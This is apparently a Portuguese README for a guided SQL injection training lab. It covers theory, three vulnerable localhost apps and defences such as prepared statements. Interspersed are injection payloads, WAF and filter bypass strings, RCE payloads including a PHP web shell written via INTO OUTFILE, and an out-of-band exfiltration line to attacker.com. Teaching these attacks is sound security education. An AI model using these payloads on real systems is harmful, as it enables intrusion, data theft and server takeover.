# 💉 SQL Injection - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 4-6 horas
**Pontos**: 85 (10 + 25 + 50)

### O Que Você Vai Aprender

✅ Fundamentos de SQL Injection
✅ Authentication bypass
✅ Data extraction (UNION-based)
✅ Blind SQL Injection (boolean e time-based)
✅ Second-order SQL Injection
✅ Bypass de WAF e filtros
✅ Exploração em contextos reais

---

## 📖 Teoria Completa

### O Que É SQL Injection?

SQL Injection (SQLi) é uma vulnerabilidade que permite que um atacante manipule queries SQL executadas pela aplicação, injetando código SQL malicioso através de inputs não sanitizados.

### Como Funciona?

#### Código Vulnerável Clássico

```python
# VULNERÁVEL ❌
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
cursor.execute(query)
```

**Input normal:**
```
username: admin
password: secret123

Query: SELECT * FROM users WHERE username='admin' AND password='secret123'
```

**Input malicioso:**
```
username: admin' OR '1'='1
password: qualquer

Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='qualquer'
```

A query retorna verdadeira para TODOS os usuários!

### Tipos de SQL Injection

#### 1. **In-Band SQLi** (Resposta na mesma conexão)

##### a) Error-based
```sql
' OR 1=1--
```
Força erros SQL que revelam informações.

##### b) UNION-based
```sql
' UNION SELECT username, password FROM users--
```
Combina resultados de múltiplas queries.

#### 2. **Blind SQLi** (Sem resposta direta)

##### a) Boolean-based
```sql
' AND '1'='1  --> True (resposta normal)
' AND '1'='2  --> False (resposta diferente)
```

##### b) Time-based
```sql
' AND SLEEP(5)--  --> Demora 5 segundos se vulnerável
```

#### 3. **Out-of-Band SQLi**
```sql
'; SELECT LOAD_FILE('\\\\attacker.com\\file')--
```
Dados são exfiltrados via DNS ou HTTP para servidor atacante.

#### 4. **Second-Order SQLi**
```sql
# Step 1: Armazena payload
username: admin'--

# Step 2: Payload é usado em outra query sem sanitização
SELECT * FROM users WHERE username='admin'--'
```

### Anatomia de uma Query SQL

```sql
SELECT column1, column2
FROM table
WHERE condition1 AND condition2
ORDER BY column
LIMIT 10
```

**Pontos de injeção:**
- Valores em WHERE: `'valor'`
- Nomes de colunas em ORDER BY: `ORDER BY nome`
- Nomes de tabelas (menos comum)
- Operadores: `=`, `LIKE`, `IN`

### Comandos SQL Úteis

#### SQLite (usado nos labs)

```sql
-- Listar tabelas
SELECT name FROM sqlite_master WHERE type='table'

-- Listar colunas de uma tabela
PRAGMA table_info(users)

-- Versão do banco
SELECT sqlite_version()

-- Comentários
-- comentário
/* comentário multi-linha */
```

#### MySQL

```sql
-- Listar databases
SELECT schema_name FROM information_schema.schemata

-- Listar tabelas
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'

-- Listar colunas
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Versão
SELECT @@version

-- Usuário atual
SELECT user()

-- Sleep (time-based)
SELECT SLEEP(5)
```

#### PostgreSQL

```sql
-- Listar databases
SELECT datname FROM pg_database

-- Listar tabelas
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- Versão
SELECT version()

-- Sleep
SELECT pg_sleep(5)
```

### Técnicas de Bypass

#### 1. Bypass de Aspas

```sql
-- Se aspas são filtradas, use char() ou hex
admin' OR 1=1--
admin\' OR 1=1--  (escaping)
0x61646d696e      (hex de 'admin')
CHAR(97,100,109,105,110)  (ASCII)
```

#### 2. Bypass de Espaços

```sql
-- Se espaços são bloqueados
'OR'1'='1'        (sem espaços)
'/**/OR/**/1=1--  (comentários)
'+OR+'1'='1'--    (concatenação)
%0AOR%0A1=1--     (newline)
```

#### 3. Bypass de Palavras-chave (OR, AND, SELECT)

```sql
-- Case variation
' oR 1=1--
' Or 1=1--

-- Double encoding
%252f = /
%2527 = '

-- Comentários inline
' O/**/R 1=1--
' UN/**/ION SE/**/LECT

-- Equivalentes
' || '1'='1   (|| em vez de OR)
' && 1=1--    (&& em vez de AND)
```

#### 4. Bypass de WAF

```sql
-- Múltiplas técnicas combinadas
admin'/**/oR/**/(1)=(1)/**/--
admin'%0AoR%0A1=1%23
admin'||'1'='1
```

### Impacto de SQL Injection

#### Autenticação

- ✅ Bypass de login
- ✅ Criação de contas admin
- ✅ Reset de senhas

#### Confidencialidade

- ✅ Extração de banco completo
- ✅ Leitura de arquivos do servidor
- ✅ Acesso a dados sensíveis

#### Integridade

- ✅ Modificação de dados
- ✅ Deleção de registros
- ✅ Corrupção de banco

#### Disponibilidade

- ✅ DoS via queries pesadas
- ✅ DROP TABLE
- ✅ TRUNCATE

#### RCE (Remote Code Execution)

```sql
-- MySQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- SQL Server
EXEC xp_cmdshell 'whoami'

-- PostgreSQL
CREATE TABLE cmd(resultado text);
COPY cmd FROM PROGRAM 'id';
```

---

## 🏗️ Estrutura do Laboratório

### Aplicações Práticas

#### 1. 🟢 **Basic App** (10 pontos)
- **Arquivo**: `basic_app.py`
- **Porta**: 5010
- **Cenário**: Sistema de login simples
- **Vulnerabilidades**:
  - SQLi direto em login
  - Sem filtros
  - Error messages revelam estrutura

#### 2. 🟡 **Intermediate App** (25 pontos)
- **Arquivo**: `intermediate_app.py`
- **Porta**: 5011
- **Cenário**: E-commerce com busca e filtros
- **Vulnerabilidades**:
  - SQLi em múltiplos endpoints (search, products, reviews)
  - Alguns filtros básicos (bypassáveis)
  - UNION-based injection
  - Comentários de usuários (stored SQLi)

#### 3. 🔴 **Advanced App** (50 pontos)
- **Arquivo**: `advanced_app.py`
- **Porta**: 5012
- **Cenário**: Sistema bancário realista
- **Vulnerabilidades**:
  - Blind SQLi (boolean e time-based)
  - Second-order SQLi
  - SQLi em JSON API
  - WAF simulado
  - Autenticação JWT + SQLi
  - Múltiplas camadas de proteção

---

## 🚀 Como Usar Este Lab

### Passo 1: Setup

```bash
# Entre no diretório
cd learn/labs/guided/01-sql-injection

# Instale dependências (se necessário)
pip install flask

# Confira os arquivos
ls -la
```

### Passo 2: Estude a Teoria

Leia esta seção (README.md) completamente antes de começar a praticar.

### Passo 3: Prática Básica

```bash
# Terminal 1: Inicia aplicação básica
python3 basic_app.py

# Terminal 2: Teste manual
curl http://localhost:5010

# Ou abra no navegador
firefox http://localhost:5010
```

Siga o arquivo `exploits.md` para guia passo a passo.

### Passo 4: Prática Intermediária

```bash
# Pare a app básica (Ctrl+C)

# Inicie intermediária
python3 intermediate_app.py

# Teste
curl http://localhost:5011
```

### Passo 5: Prática Avançada

```bash
python3 advanced_app.py
curl http://localhost:5012
```

### Passo 6: Exercícios

Complete os desafios em `exercises.md`.

---

## 🎯 Objetivos de Aprendizado

Ao completar este laboratório, você será capaz de:

### Nível Básico
✅ Identificar pontos de injeção SQL
✅ Realizar authentication bypass
✅ Extrair dados com UNION SELECT
✅ Entender mensagens de erro SQL

### Nível Intermediário
✅ Explorar SQLi em diferentes contextos (GET, POST, JSON)
✅ Bypassar filtros básicos
✅ Extrair estrutura do banco (tables, columns)
✅ Automatizar exploração com scripts Python

### Nível Avançado
✅ Explorar Blind SQL Injection
✅ Criar exploits para time-based SQLi
✅ Identificar e explorar second-order SQLi
✅ Bypassar WAFs e proteções avançadas
✅ Encadear SQLi com outras vulnerabilidades

---

## 📚 Recursos Adicionais

### Cheat Sheets

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PentestMonkey MySQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

### Ferramentas

- **SQLMap** - Automação de SQLi
  ```bash
  sqlmap -u "http://localhost:5010/login" --data="username=admin&password=test"
  ```

- **jSQL Injection** - GUI para SQLi
- **Burp Suite** - Interceptar e modificar requests

### Prática Adicional

- **PortSwigger Academy** - SQL Injection labs gratuitos
- **HackTheBox** - Máquinas com SQLi
- **TryHackMe** - SQLi room

### Leitura Avançada

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLi Filter Evasion Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [Advanced SQL Injection](https://www.exploit-db.com/docs/english/13045-advanced-sql-injection-in-sql-server-applications.pdf)

---

## 🔒 Prevenção

### Correção CORRETA

#### 1. Prepared Statements (MELHOR)

```python
# Python + SQLite
cursor.execute("SELECT * FROM users WHERE username=? AND password=?",
               (username, password))

# Python + PostgreSQL (psycopg2)
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s",
               (username, password))

# Python + MySQL (mysql-connector)
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s",
               (username, password))
```

#### 2. ORMs (Object-Relational Mapping)

```python
# SQLAlchemy
user = session.query(User).filter_by(username=username, password=password).first()

# Django ORM
user = User.objects.filter(username=username, password=password).first()
```

#### 3. Input Validation

```python
import re

def validate_username(username):
    # Apenas alfanumérico e underscore
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        raise ValueError("Invalid username")
    return username

# Use whitelist, não blacklist!
```

#### 4. Least Privilege

```sql
-- Crie usuário com permissões mínimas
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';
-- NÃO dê DROP, DELETE, FILE privileges
```

#### 5. WAF (Web Application Firewall)

- ModSecurity
- Cloudflare WAF
- AWS WAF

**Mas lembre-se**: WAF não é solução, é mitigação!

### Correções INCORRETAS (Não use!)

❌ **Escape manual**
```python
username = username.replace("'", "\\'")  # Pode ser bypassado!
```

❌ **Blacklist**
```python
if 'OR' in input or 'AND' in input:  # Fácil bypass com 'oR', 'Or'
    return error
```

❌ **Apenas remover caracteres**
```python
input = input.replace("'", "")  # SELECT * FROM users WHERE username=adminAND 1=1
```

---

## 📝 Checklist de Conclusão

- [ ] Li e entendi a teoria completa
- [ ] Completei Basic App (10 pts)
  - [ ] Authentication bypass
  - [ ] Error-based extraction
- [ ] Completei Intermediate App (25 pts)
  - [ ] SQLi em search
  - [ ] SQLi em product filter
  - [ ] UNION-based extraction
  - [ ] Stored SQLi em comments
- [ ] Completei Advanced App (50 pts)
  - [ ] Blind boolean-based SQLi
  - [ ] Blind time-based SQLi
  - [ ] Second-order SQLi
  - [ ] Bypass de WAF
  - [ ] SQLi em JSON API
- [ ] Completei todos os exercícios
- [ ] Criei meus próprios payloads
- [ ] Documentei minhas descobertas
- [ ] Automatizei pelo menos uma exploração

**Total**: 85 pontos

---

## 🎓 Próximos Passos

Após dominar SQL Injection:

1. **NoSQL Injection** - MongoDB, CouchDB
2. **ORM Injection** - SQLAlchemy, Hibernate
3. **GraphQL Injection**
4. **LDAP Injection**

**Próximo Lab**: [02 - XSS (Cross-Site Scripting) →](../02-xss/README.md)

---

**Boa sorte e happy hacking! 💉**
